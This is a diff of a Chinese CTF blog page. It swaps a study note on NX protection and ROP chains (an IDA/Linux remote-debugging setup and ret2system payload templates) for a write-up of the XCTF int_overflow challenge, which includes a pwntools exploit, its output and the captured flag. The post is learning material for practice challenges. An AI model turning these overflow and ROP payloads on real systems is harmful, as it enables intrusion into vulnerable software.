@@ -16,26 +16,25 @@
   <meta name="author" content="kawa_von">
   <meta name="keywords" content="">
   
-    <meta name="description" content="什么是NX与ROPNX即为no execute bit，即禁止执行位以下是wiki中文的解释  支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执">
+    <meta name="description" content="整数类型的溢出以xctf平台的pwn新手区int_overflow为例into 为rename的elf文件 0X1 file intochmod 777 into.&#x2F;into  先确定into为32位elf文件 0X2win环境下，32位IDA进行分析有明显的后门函数what_is_this()进入login()后结合下图看看首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NX-ROP">
-<meta property="og:url" content="http://example.com/2022/03/02/NX-ROP/index.html">
+<meta property="og:title" content="xctf int_overflow整数类型的溢出">
+<meta property="og:url" content="http://example.com/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="FCさん の Blog">
-<meta property="og:description" content="什么是NX与ROPNX即为no execute bit，即禁止执行位以下是wiki中文的解释  支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执">
+<meta property="og:description" content="整数类型的溢出以xctf平台的pwn新手区int_overflow为例into 为rename的elf文件 0X1 file intochmod 777 into.&#x2F;into  先确定into为32位elf文件 0X2win环境下，32位IDA进行分析有明显的后门函数what_is_this()进入login()后结合下图看看首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/03/02/NX-ROP/cto1.png">
-<meta property="og:image" content="http://example.com/2022/03/02/NX-ROP/cto2.png">
-<meta property="og:image" content="http://example.com/2022/03/02/NX-ROP/cto3.png">
-<meta property="og:image" content="http://example.com/2022/03/02/NX-ROP/cto4.png">
-<meta property="article:published_time" content="2022-03-02T12:59:32.000Z">
-<meta property="article:modified_time" content="2022-03-06T15:09:02.210Z">
+<meta property="og:image" content="http://example.com/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png">
+<meta property="og:image" content="http://example.com/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png">
+<meta property="og:image" content="http://example.com/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png">
+<meta property="article:published_time" content="2022-03-06T15:08:07.000Z">
+<meta property="article:modified_time" content="2022-03-06T15:39:28.965Z">
 <meta property="article:author" content="kawa_von">
 <meta property="article:tag" content="ctf in do♂r">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2022/03/02/NX-ROP/cto1.png">
+<meta name="twitter:image" content="http://example.com/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png">
   
   
-  <title>NX-ROP - FCさん の Blog</title>
+  <title>xctf int_overflow整数类型的溢出 - FCさん の Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -181,7 +180,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="NX-ROP">
+            <span class="h2" id="subtitle" title="xctf int_overflow整数类型的溢出">
               
             </span>
 
@@ -191,8 +190,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-03-02 20:59" pubdate>
-        2022年3月2日 晚上
+      <time datetime="2022-03-06 23:08" pubdate>
+        2022年3月6日 晚上
       </time>
     </span>
   
@@ -202,7 +201,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.1k 字
+      1.3k 字
     </span>
   
 
@@ -211,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18 分钟
+      11 分钟
     </span>
   
 
@@ -240,36 +239,25 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">NX-ROP</h1>
+            <h1 style="display: none">xctf int_overflow整数类型的溢出</h1>
             
             <div class="markdown-body">
-              <h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p>
-<blockquote>
-<p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p>
+              <h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p>
+<h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote>
+<p>file into<br>chmod 777 into<br>./into</p>
 </blockquote>
-<p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
-<p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p>
+<p>先确定into为32位elf文件</p>
+<h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" srcset="/img/loading.gif" lazyload alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" srcset="/img/loading.gif" lazyload alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" srcset="/img/loading.gif" lazyload alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p>
+<p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p>
 </blockquote>
-<p>再次感谢原文大佬作者！</p>
-<h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" srcset="/img/loading.gif" lazyload alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p>
-<h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p>
-<h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p>
+<p>linux中</p>
 <blockquote>
-<p>ROPgadget –binary 文件名 | grep “pop rdi”</p>
+<p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a target="_blank" rel="noopener" href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a target="_blank" rel="noopener" href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p>
 </blockquote>
-<p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p>
-<blockquote>
-<p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p>
-</blockquote>
-<p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p>
-<blockquote>
-<p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p>
-</blockquote>
-<p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p>
-<p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>
+<p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p>
+<p>结束</p>
+<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>
 
             </div>
             <hr>
@@ -297,18 +285,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">xctf int_overflow整数类型的溢出</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/02/23/start/">
-                        <span class="hidden-mobile">start</span>
+                      <a href="/2022/03/02/NX-ROP/">
+                        <span class="hidden-mobile">NX-ROP</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
